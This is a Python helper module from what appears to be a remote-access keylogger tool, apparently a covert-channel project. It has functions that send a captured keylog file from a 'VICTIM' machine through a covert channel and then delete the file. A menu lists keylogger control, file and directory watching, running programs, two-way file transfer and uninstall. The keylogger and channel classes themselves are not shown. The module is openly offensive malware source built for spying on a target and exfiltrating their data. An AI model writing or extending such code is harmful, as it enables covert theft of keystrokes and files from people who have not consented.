import socket
import os

def get_ip_address():
    """
    Get the local IP address of the machine.

    Returns:
        str: Local IP address.
    """
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        s.connect(("8.8.8.8", 80))
        name = s.getsockname()[0]
    return name

def transfer_keylog_file(keylogger, covert, file_path):
    """
    Transfer the keylog file.

    Args:
        keylogger (Keylogger): Keylogger instance.
        covert (CovertChannel): Covert channel instance.
        file_path (str): Path of the keylog file.

    Returns:
        int: Status code (3 if unsuccessful).
    """
    if keylogger.get_status():
        print("VICTIM:: Cannot transfer, Keylogger running")
        return 3
    
    if not os.path.exists(file_path):
        print("VICTIM:: keylog.txt does not exist")
        return 3
    
    covert.cmd = 0
    covert.send_data(for_victim=False)
    covert.cmd = None
    covert.file_name = file_path
    covert.send_data(for_victim=False, event="IN_CREATE")
    covert.file_name = None
    os.remove(file_path)

def make_dir(ip_address):
    """
    Create directories for watching and deleting files.

    Args:
        ip_address (str): IP address.

    Returns:
        str: Directory path.
    """
    directory = 'downloads' + '/' + ip_address + "/watching"
    os.makedirs(directory, exist_ok=True)
    
    directory = 'downloads' + '/' + ip_address + "/deleted"
    os.makedirs(directory, exist_ok=True)
    
    return directory

def display_menu():
    """
    Display the menu for the user.

    Returns:
        None
    """
    print(f"""
          \n-------------- MENU --------------\n
          1. Start Keylogger\n
          2. Stop Keylogger\n
          3. Transfer Keylog File\n
          4. Watch File\n
          5. Stop Watching File\n 
          6. Watch Directory\n
          7. Stop Watching Directory\n
          8. Run Program\n
          9. Transfer File From\n
          10.Transfer File To\n 
          11.Disconnect\n
          12.Uninstall
          """
          )

def check_exists(path):
    """
    Check if a file or directory exists.

    Args:
        path (str): Path to check.

    Returns:
        bool: True if exists, False otherwise.
    """
    if os.path.exists(path):
        return True
    return False
